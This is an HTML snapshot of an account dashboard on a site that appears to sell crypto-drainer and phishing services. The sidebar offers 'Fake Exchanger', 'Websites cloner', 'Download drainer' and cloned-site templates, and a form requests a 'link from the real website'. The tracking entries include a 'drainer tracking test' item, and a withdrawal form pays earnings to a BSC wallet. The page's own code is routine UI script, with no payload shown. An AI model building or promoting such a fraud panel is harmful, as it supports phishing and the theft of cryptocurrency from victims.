+                        <span data-bs-toggle="tooltip" data-bs-title="Copy link" onclick="coppysharelink16()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy16"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink16() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink16");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy16").innerHTML = "Copied !"
+                        }
+                    </script>
+                                    </div>
+            </div>
+                        <div id="11556" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">Foxxy  </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 5 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11556)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink17s" value="GOMJWJXCDEUSYDNGZYMTIIWCKAXU4UJ3FLVYYXTDFSFUN" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink17s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy17s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink17() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink17");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy17").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink17s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink17s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy17s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11555" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">drainer tracking test 007 </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 5 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11555)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink18s" value="WWNTFA3RNJJXIE6DZCZVOCCA8FRRAUKXJP3QRLZLRQTTD" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink18s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy18s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink18() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink18");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy18").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink18s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink18s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy18s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11553" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;"> </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 5 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11553)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink19s" value="BAANYIZYEEZNN6FHUHEHARBZ79K3MYQ7BYJ5FEZYIZNCX" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink19s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy19s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink19() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink19");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy19").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink19s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink19s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy19s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11549" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">Axeb2b </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 6 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11549)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink20s" value="NLIJKTZ6QZBS8G9PDOZTWAJBTIG38D6JUSV9C8JHJX1O4" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink20s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy20s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink20() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink20");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy20").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink20s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink20s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy20s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11542" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">Axeb2b </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 6 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11542)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink21s" value="HNOFMLOP13SW4WSMSOMPVAZJCGHWFI3VRNOTPBNFQHN1T" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink21s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy21s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink21() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink21");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy21").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink21s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink21s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy21s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                            
+                                
+                
+            </div> 
+        </div>
+        
+            
+    </div>
+</div>
+
+<script>
+    function removefavorit(id){
+        var div = "#"+id;
+        $(div).hide(200);
+        
+        $.ajax({    
+            type: 'POST',
+            data: 'linkid='+id,
+            url:  "https://exogator.com/en/fav", 
+            success: function(olaaa) {
+                
+            }
+        });
+       
+    }
+</script>
+
+
+<div class="sidebar" style="overflow-x: hidden; overflow-y: auto; ">
+    <div class="logo-details">
+    
+        <i class='bx bx-chevron-right' id="btn" ></i>
+    </div>
+    <ul class="nav-list">
+      <li>
+        <a href="https://exogator.com/en/account/dashboard">
+          <i class='bx bx-grid-alt'></i>
+          <span class="links_name">Dashboard</span>
+        </a>
+         <span class="tooltip">Dashboard</span>
+      </li>
+      <li>
+       <a href="https://exogator.com/en/account/balance">
+         <i class='bx bx-money-withdraw' ></i>
+         <span class="links_name">Earnings</span>
+       </a>
+       <span class="tooltip">Earnings</span>
+     </li>
+     <li>
+       <a href="https://exogator.com/en/account/links">
+         <i class='bx bx-link-alt' ></i>
+         <span class="links_name">Link & Tracking</span>
+       </a>
+       <span class="tooltip">Link & Tracking</span>
+     </li>
+     <li>
+       <a href="https://exogator.com/en/account/trackcreate">
+         <i class='bx bx-bullseye' ></i>
+         <span class="links_name">Create tracking</span>
+       </a>
+       <span class="tooltip">Create tracking</span>
+     </li>
+     <li>
+       <a href="https://exogator.com/en/account/exchanger">
+         <i class='bx bxs-hot'  ></i> 
+         <span class="links_name">Fake Exchanger</span>
+       </a>
+       <span class="tooltip">Fake Exchanger</span>
+     </li>
+     <li>
+       <a href="https://exogator.com/en/account/pages">
+         <i class='bx bx-archive' ></i>
+         <span class="links_name">Templates</span>
+       </a>
+       <span class="tooltip">Templates</span>
+     </li>
+      <li>
+       <a href="https://exogator.com/en/account/pagerequest">
+         <i class='bx bx-message-square-add' ></i>
+         <span class="links_name">Request Template</span>
+       </a>
+       <span class="tooltip">Request Template</span>
+     </li>
+     <li>
+       <a href="https://exogator.com/en/account/copywebsite">
+         <i class='bx bx-copy' ></i>
+         <span class="links_name">Websites cloner</span>
+       </a>
+       <span class="tooltip">Websites cloner</span>
+     </li>
+     <li>
+       <a href="https://exogator.com/en/account/linkcreate">
+         <i class='bx bx-edit-alt' ></i>
+         <span class="links_name">Page Creator</span>
+       </a>
+       <span class="tooltip">Page Creator</span>
+     </li>
+     <li>
+       <a href="https://exogator.com/en/account/affiliate">
+         <i class='bx bx-leaf' ></i>
+         <span class="links_name">Referral program</span>
+       </a>
+       <span class="tooltip">Referral program</span>
+     </li>
+     <li>
+       <a href="https://exogator.com/en/account/linkdrainer">
+         <i class='bx bx-cloud-download'></i>
+         <span class="links_name">Download drainer</span>
+       </a>
+       <span class="tooltip">Download drainer</span>
+     </li>
+      <li>
+       <a href="https://exogator.com/en/account/methodes">
+         <i class='bx bx-map-alt'></i>
+         <span class="links_name">Methods</span>
+       </a>
+       <span class="tooltip">Methods</span>
+     </li>
+      <li>
+       <a href="https://exogator.com/en/account/guide">
+         <i class='bx bx-compass'></i>
+         <span class="links_name">Guide</span>
+       </a>
+       <span class="tooltip">Guide</span>
+     </li>
+     <li>
+       <a href="https://exogator.com/en/account/tools">
+         <i class='bi bi-tools'></i>
+         <span class="links_name">Tools</span>
+       </a>
+       <span class="tooltip">Tools</span>
+     </li>
+    
+    </ul>
+</div>
+
+
+<script>
+let sidebar = document.querySelector(".sidebar");
+let closeBtn = document.querySelector("#btn");
+let searchBtn = document.querySelector(".bx-search");
+closeBtn.addEventListener("click", ()=>{
+sidebar.classList.toggle("open");
+menuBtnChange();//calling the function(optional)
+});
+searchBtn.addEventListener("click", ()=>{ // Sidebar open when you click on the search iocn
+sidebar.classList.toggle("open");
+menuBtnChange(); //calling the function(optional)
+});
+// following are the code to change sidebar button(optional)
+function menuBtnChange() {
+if(sidebar.classList.contains("open")){
+ closeBtn.classList.replace("bx-chevron-right", "bx-chevron-left");//replacing the iocns class
+}else {
+ closeBtn.classList.replace("bx-chevron-left","bx-chevron-right");//replacing the iocns class
+}
+}
+</script>
+
+
+
+<style>
+    .telegram-button {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background-color: #0088cc;
+    border-radius: 50%;
+    padding: 0px;
+    box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+    z-index: 1000;
+    transition: transform 0.3s ease;
+}
+
+.telegram-button img {
+    width: 69px; /* Default size of the Telegram icon */
+    border-radius: 50%;
+}
+
+.telegram-button:hover {
+    transform: scale(1.1); /* Slight zoom on hover */
+}
+
+/* Media query for smaller screens like phones */
+@media (max-width: 600px) {
+    .telegram-button {
+        bottom: 15px;  /* Adjust position for mobile */
+        right: 15px;
+        padding: 0px;
+    }
+
+    .telegram-button img {
+        width: 60px;  /* Smaller size for the Telegram icon */
+
+    }
+}
+
+</style>
+
+<a href="https://t.me/exogator15" target="_blank" class="telegram-button">
+    <img src="https://i.imgur.com/ASVytqF.jpeg" alt="Chat with us on Telegram" />
+</a>
+
+
+<script>
+    window.addEventListener("scroll", function() {
+        const telegramButton = document.querySelector(".telegram-button");
+        if (window.scrollY > 10) { // Show button after scrolling 100px
+            telegramButton.style.opacity = "1";
+        } else {
+            telegramButton.style.opacity = "0";
+        }
+    });
+</script>
+
+<div class="hover_bkgr_fricc" id="waitdownload" style="display: none;">
+    <span class="helper"></span>
+    <div style="padding: 0;">
+        <div id="backstep1" class="col-12 in"  > <t></t> </div>
+        <div class="popupCloseButton" id="waitdownloadclose" >Close <i class="bi bi-x-lg" style=" width: 6px !important; color: #fff; "></i></div>
+        <div style="text-align: center;padding: 30px 30px;"> 
+            <i class="bi bi-stoplights" style=" font-size: 62px; text-align: center; "></i> 
+            <b style="font-size: 28px;display: block;font-weight: 500;text-align: center;">Download Limit </b> 
+            <t style=" font-weight: 300; margin-top: 1px; color: #ccc; margin-bottom: 41px; ">You can only download one file every hour to prevent abuse. Please wait <r style="color:#abfb4f; font-weight: 500;" id="waititme"></r> before starting another download.</t> 
+            <button id="waitdownloadclose2" style="background: #abfb4f;color: #000 !important;border-radius: 18px;padding: 13px 2px;font-size: 18px;border: 2px solid #d6ebfd30;width: 100%;margin-top: 2px;" class="btn btn-primary">i understand </button> 
+        </div>
+    </div>
+</div>
+
+<div class="hover_bkgr_fricc" id="burger" style="display: none;">
+    <span class="helper"></span>
+    <div style="padding: 0;">
+        <div id="backstep1" class="col-12 in"  > <t></t> </div>
+        <div class="popupCloseButton" id="burgerclose" >Close <i class="bi bi-x-lg" style=" width: 6px !important; color: #fff; "></i></div>
+        <div id="viewburger" class="order-info-rab" style="padding: 20px 25px;">  
+            <style> .burgerbutton {margin: 0;background: #ececec;border: 0;color: #000 !important;margin-top: 10px;width: 100%;border-radius: 16px;padding: 14px 2px;font-size: 16px;font-weight: 600;}</style>
+            <div class="row" style="margin:0; padding:0;">
+                
+                <a href="https://exogator.com/en/buy"><button class="burgerbutton" style="color:#acfb50 !important; font-weight: 400; margin: 6px 0px;"> Select a Plan </button></a>
+                <a href="https://exogator.com/en/howitswork"><button class="burgerbutton" style="color:#acfb50 !important; font-weight: 400; margin: 6px 0px;"> How It Works ?</button></a>
+                <a href="https://t.me/exogator15/7"><button class="burgerbutton" style="color:#acfb50 !important; font-weight: 400; margin: 6px 0px;"> Join our Telegram</button></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="hover_bkgr_fricc" id="feesdata" style="display: none;">
+    <span class="helper"></span>
+    <div style="padding: 0;">
+        <div class="popupCloseButton" onclick="closefeesinfo()" >Close <i class="bi bi-x-lg" style=" width: 6px !important; color: #fff; "></i></div>
+        <div class="order-info-rab" style="padding: 20px 25px;">  
+            <div id="feesinfo" class="row" style="margin: 0; text-align: left; background: #121212; padding: 20px 6px; border-radius: 20px;">
+
+            </div>
+        </div>
+    
+    </div>
+</div>
+
+<div class="hover_bkgr_fricc" id="withdrawal" style="display: none;">
+    <span class="helper"></span>
+    <div style="padding: 0;"> 
+        <div class="popupCloseButton" id="withdrawalclose" >Close <i class="bi bi-x-lg" style=" width: 6px !important; color: #fff; "></i></div>
+        <div style=" text-align: left; padding: 30px 30px; "> 
+        
+            <form method="POST" action ="../query/withdrawal">
+                <b style=" font-size: 18px; font-weight: 500; ">Request Withdrawal</b> 
+                <t style=" font-weight: 300; margin-top: 1px; color: #ccc; margin-bottom: 41px; ">Request to withdraw funds to your wallet automatically.</t> 
+        
+                <label style="font-size: 18px;margin-left: 7px;color: #898989;">I want to withdraw</label> 
+                <div class="input-group" style="margin: 10px 0px 0px 0px;" > 
+                    <input type="number" class="form-control no-border" name="amount" id="amount" value="1" min = "0" max = "1" style=" 13px; padding: 12px 18px; border-radius: 18px; "> 
+                </div> 
+        
+                <label style="font-size: 18px;margin-left: 7px;margin-top: 18px;color: #898989;">To address and network</label> 
+                <div class="input-group"  style=" margin: 10px 0px 0px 0px; "> 
+                    <input value="0xdc8A5Db2c0Eb2881aAe0821FAa23d453b3767418" disabled  class="form-control no-border" style=" padding: 12px 18px; border-radius: 18px 0px 0px 18px;"> 
+                    <span class="input-group-text translate translatable" id="basic-addon2" style=" padding: 12px 18px; border-radius: 0px 18px 18px 0px; color: #fff; background: #000; ">BSC</span> 
+                </div> 
+        
+                <label style="font-size: 18px;margin-left: 7px;margin-top: 18px;color: #898989;">Two-step authentication code</label> 
+                <div class="input-group" style="margin: 10px 0px 0px 0px;" > 
+                    <input type="text" class="form-control no-border" name="2facode" id="2facode" placeholder="123456" style=" padding: 12px 18px; border-radius: 18px; "> 
+                </div> 
+        
+                <button  type="submit" style=" background: #abfb4f; color: #000 !important; border-radius: 18px; padding: 13px 2px; font-size: 18px; border: 2px solid #d6ebfd30; width: 100%; " class="btn btn-primary">Withdraw</button> 
+                                
+            </form>
+            
+        </div> 
+    </div>
+</div>
+
+<div class="hover_bkgr_fricc" id="pagerequest" style="display: none;">
+    <span class="helper"></span>
+    <div style="padding: 0;"> 
+        <div class="popupCloseButton" id="pagerequestclose" >Close <i class="bi bi-x-lg" style=" width: 6px !important; color: #fff; "></i></div>
+        <div style=" text-align: left; padding: 30px 30px; "> 
+        
+            <form method="POST" action ="../query/pagerequest">
+                <b style=" font-size: 18px; font-weight: 500; ">Request Template</b> 
+                <t style=" font-weight: 300; margin-top: 1px; color: #ccc; margin-bottom: 41px; ">Please specify the template you'd like our team to create for you. If you require any changes, kindly list them in the comments section. Please note that our team can only create 1-2 pages per template request.</t> 
+        
+                <label style="font-size: 18px;margin-left: 7px;color: #898989;">Template link (from the real website)</label> 
+                <div class="input-group" style="margin: 10px 0px 0px 0px;" > 
+                    <input type="link" class="form-control no-border" name="linktemp" required style=" 13px; padding: 12px 18px; border-radius: 18px; "> 
+                </div> 
+                
+                <label style="margin-top:20px;  font-size: 18px;margin-left: 7px;color: #898989;">Additional edits</label> 
+                <div class="input-group" style="margin: 10px 0px 0px 0px;" > 
+                   <textarea class="form-control no-border" name="adittional"  style=" 13px; padding: 12px 18px; border-radius: 18px; "> </textarea>
+                </div> 
+                
+                <button type="submit" style=" background: #abfb4f; color: #000 !important; border-radius: 18px; padding: 13px 2px; font-size: 18px; border: 2px solid #d6ebfd30; width: 100%; " class="btn btn-primary">
+                                        Request & <r style="color: #000000; text-decoration-line: line-through;">Pay 29.99$</r> (Free)
+                                    </button> 
+                
+            </form>
+        </div> 
+    </div>
+</div>
+
+<script> 
+
+    document.addEventListener("DOMContentLoaded", function () {
+        const homeRows = document.querySelectorAll('.home-row');
+
+        const observer = new IntersectionObserver((entries, observer) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('show');
+                    observer.unobserve(entry.target); // Stop observing once the effect has been applied
+                }
+            });
+        });
+
+        homeRows.forEach(row => {
+            observer.observe(row);
+        });
+    });
+
+
+     
+    
+    function toggleBalance() {
+        const balance = document.getElementById('balance');
+        const icon = document.getElementById('toggle-icon');
+        const isBalanceVisible = balance.textContent !== '****';
+
+        if (isBalanceVisible) {
+            // Hide the balance and change the icon
+            balance.textContent = '****';
+            icon.classList.remove('bi-eye-slash');
+            icon.classList.add('bi-eye');
+            setCookie('balanceVisibility', 'hidden', 7); // Save choice in cookie
+        } else {
+            // Show the balance and change the icon back
+            balance.textContent = '$0.86'; // Replace with your dynamic balance value
+            icon.classList.remove('bi-eye');
+            icon.classList.add('bi-eye-slash');
+            setCookie('balanceVisibility', 'visible', 7); // Save choice in cookie
+        }
+    }
+    
+    function showtopup(){ toggleBalance(); }
+
+    // Set up the event listener
+    document.getElementById('toggle-icon').addEventListener('click', toggleBalance);
+
+    // Check cookie and set balance visibility on page load
+    window.onload = function() {
+        const balanceVisibility = getCookie('balanceVisibility');
+        const balance = document.getElementById('balance');
+        const icon = document.getElementById('toggle-icon');
+
+        if (balanceVisibility === 'hidden') {
+            // Hide the balance if the cookie says it was hidden
+            balance.textContent = '****';
+            icon.classList.remove('bi-eye-slash');
+            icon.classList.add('bi-eye');
+        } else {
+            // Show the balance if the cookie says it was visible
+            balance.textContent = '$0,86'; // Replace with your dynamic balance value
+            icon.classList.remove('bi-eye');
+            icon.classList.add('bi-eye-slash');
+        }
+    };
+
+    
+    const selectedAll = document.querySelectorAll(".wrapper-dropdown");
+
+    function dropme(){
+        selectedAll = document.querySelectorAll(".wrapper-dropdown");
+    }
+
+    selectedAll.forEach((selected) => {
+      const optionsContainer = selected.children[2];
+      const optionsList = selected.querySelectorAll("div.wrapper-dropdown li");
+    
+      selected.addEventListener("click", () => {
+        let arrow = selected.children[1];
+    
+        if (selected.classList.contains("active")) {
+          handleDropdown(selected, arrow, false);
+        } else {
+          let currentActive = document.querySelector(".wrapper-dropdown.active");
+    
+          if (currentActive) {
+            let anotherArrow = currentActive.children[1];
+            handleDropdown(currentActive, anotherArrow, false);
+          }
+    
+          handleDropdown(selected, arrow, true);
+        }
+      });
+    
+      // update the display of the dropdown
+      for (let o of optionsList) {
+        o.addEventListener("click", () => {
+          selected.querySelector(".selected-display").innerHTML = o.innerHTML;
+        });
+      }
+    });
+    
+    // check if anything else ofther than the dropdown is clicked
+    window.addEventListener("click", function (e) {
+      if (e.target.closest(".wrapper-dropdown") === null) {
+        closeAllDropdowns();
+      }
+    });
+    
+    // close all the dropdowns
+    function closeAllDropdowns() {
+      const selectedAll = document.querySelectorAll(".wrapper-dropdown");
+      selectedAll.forEach((selected) => {
+        const optionsContainer = selected.children[2];
+        let arrow = selected.children[1];
+    
+        handleDropdown(selected, arrow, false);
+      });
+    }
+    
+    // open all the dropdowns
+    function handleDropdown(dropdown, arrow, open) {
+      if (open) {
+        arrow.classList.add("rotated");
+        dropdown.classList.add("active");
+      } else {
+        arrow.classList.remove("rotated");
+        dropdown.classList.remove("active");
+      }
+    }
+
+    
+    $('#loginfirstclose').click(function(){
